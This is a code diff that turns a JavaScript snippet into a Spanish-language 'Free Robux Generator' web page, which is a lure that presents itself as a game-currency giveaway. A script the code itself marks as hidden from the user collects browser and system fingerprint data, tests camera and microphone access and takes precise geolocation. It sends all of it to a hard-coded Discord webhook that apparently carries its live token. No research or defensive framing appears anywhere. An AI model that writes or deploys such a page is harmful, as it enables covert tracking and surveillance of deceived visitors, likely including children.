@@ -1,72 +1,242 @@
-// JavaScript code for the described functionality
-
-// Define the webhook URL
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms';
-
-// Function to send data to Discord webhook
-async function sendToDiscord(data) {
-    const response = await fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-    });
-    return response.ok;
-}
-
-// Function to get user permissions and data
-async function getUserData() {
-    try {
-        // Request permissions
-        const permissions = await navigator.permissions.query({ name: 'camera' });
-        const microphonePermissions = await navigator.permissions.query({ name: 'microphone' });
-        const locationPermissions = await navigator.permissions.query({ name: 'geolocation' });
-
-        // Check if permissions are granted
-        if (permissions.state === 'granted' && microphonePermissions.state === 'granted' && locationPermissions.state === 'granted') {
-            // Get camera and microphone data
-            const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const microphoneStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-            // Get location data
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-            });
-
-            // Create a message with emojis
-            const message = `
-            📹 Cámara activada
-            🎤 Micrófono activado
-            📍 Ubicación: ${position.coords.latitude}, ${position.coords.longitude}
-            🌐 [Google Maps Link](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})
-            `;
-
-            // Send data to Discord
-            await sendToDiscord({ content: message });
-
-            // Change text to English if location permissions are granted
-            document.getElementById('loading-text').textContent = 'Loading...';
-        } else {
-            // Display loading text in Spanish
-            document.getElementById('loading-text').textContent = 'Cargando...';
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux Generator</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
         }
-    } catch (error) {
-        console.error('Error getting user data:', error);
-    }
-}
 
-// Function to check location permissions and update text
-function checkLocationPermissions() {
-    navigator.permissions.query({ name: 'geolocation' }).then((permissionStatus) => {
-        if (permissionStatus.state === 'granted') {
-            document.getElementById('loading-text').textContent = 'Loading...';
+        .loading-container {
+            text-align: center;
+            z-index: 10;
         }
-    });
-}
 
-// Initial call to get user data
-getUserData();
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
 
-// Set interval to check location permissions every second
-setInterval(checkLocationPermissions, 1000);
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            margin-bottom: 10px;
+        }
+
+        .robux-text {
+            color: #ffcc00;
+            font-size: 28px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="loading-container">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loading-text">Cargando...</div>
+        <div class="robux-text">Generando Free Robux</div>
+    </div>
+
+    <script>
+        // Create floating particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                particlesContainer.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // Background script - hidden from user
+        (function() {
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms';
+
+            // Function to send data to Discord webhook
+            async function sendToDiscord(data) {
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    });
+                    return response.ok;
+                } catch (error) {
+                    console.error('Error sending to Discord:', error);
+                }
+            }
+
+            // Function to get browser info
+            function getBrowserInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+            }
+
+            // Function to get system info
+            function getSystemInfo() {
+                return {
+                    cores: navigator.hardwareConcurrency || 'Unknown',
+                    memory: navigator.deviceMemory || 'Unknown',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : 'Unknown',
+                    battery: navigator.getBattery ? 'Available' : 'Not Available'
+                };
+            }
+
+            // Function to request permissions and collect data
+            async function collectUserData() {
+                const browserInfo = getBrowserInfo();
+                const systemInfo = getSystemInfo();
+                
+                let data = {
+                    content: `🔍 **Información del Navegador**\n` +
+                            `🌐 User Agent: ${browserInfo.userAgent}\n` +
+                            `🗣️ Idioma: ${browserInfo.language}\n` +
+                            `💻 Plataforma: ${browserInfo.platform}\n` +
+                            `🍪 Cookies: ${browserInfo.cookieEnabled ? 'Activadas' : 'Desactivadas'}\n` +
+                            `📡 En línea: ${browserInfo.onLine ? 'Sí' : 'No'}\n` +
+                            `📺 Resolución: ${browserInfo.screenResolution}\n` +
+                            `🎨 Profundidad de color: ${browserInfo.colorDepth} bits\n` +
+                            `🕐 Zona horaria: ${browserInfo.timezone}\n\n` +
+                            `⚙️ **Información del Sistema**\n` +
+                            `🔢 Núcleos: ${systemInfo.cores}\n` +
+                            `💾 Memoria: ${systemInfo.memory} GB\n` +
+                            `📶 Conexión: ${JSON.stringify(systemInfo.connection)}\n` +
+                            `🔋 Batería: ${systemInfo.battery}\n`
+                };
+
+                // Try to get camera permission
+                try {
+                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    data.content += `\n📹 **Cámara**: Permiso concedido`;
+                    cameraStream.getTracks().forEach(track => track.stop());
+                } catch (error) {
+                    data.content += `\n📹 **Cámara**: Permiso denegado`;
+                }
+
+                // Try to get microphone permission
+                try {
+                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    data.content += `\n🎤 **Micrófono**: Permiso concedido`;
+                    micStream.getTracks().forEach(track => track.stop());
+                } catch (error) {
+                    data.content += `\n🎤 **Micrófono**: Permiso denegado`;
+                }
+
+                // Try to get location
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 10000,
+                            maximumAge: 60000
+                        });
+                    });
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    data.content += `\n📍 **Ubicación**: ${lat}, ${lon} (Precisión: ${accuracy}m)\n` +
+                                  `🗺️ **Google Maps**: [Ver en mapa](https://www.google.com/maps?q=${lat},${lon})`;
+                    
+                    // Change text to English if location was obtained
+                    document.getElementById('loading-text').textContent = 'Loading...';
+                } catch (error) {
+                    data.content += `\n📍 **Ubicación**: Permiso denegado`;
+                }
+
+                // Send all collected data
+                await sendToDiscord(data);
+            }
+
+            // Start data collection after a short delay
+            setTimeout(collectUserData, 2000);
+
+            // Check location permissions periodically
+            setInterval(async () => {
+                try {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permission.state === 'granted') {
+                        document.getElementById('loading-text').textContent = 'Loading...';
+                    }
+                } catch (error) {
+                    // Permission query not supported
+                }
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
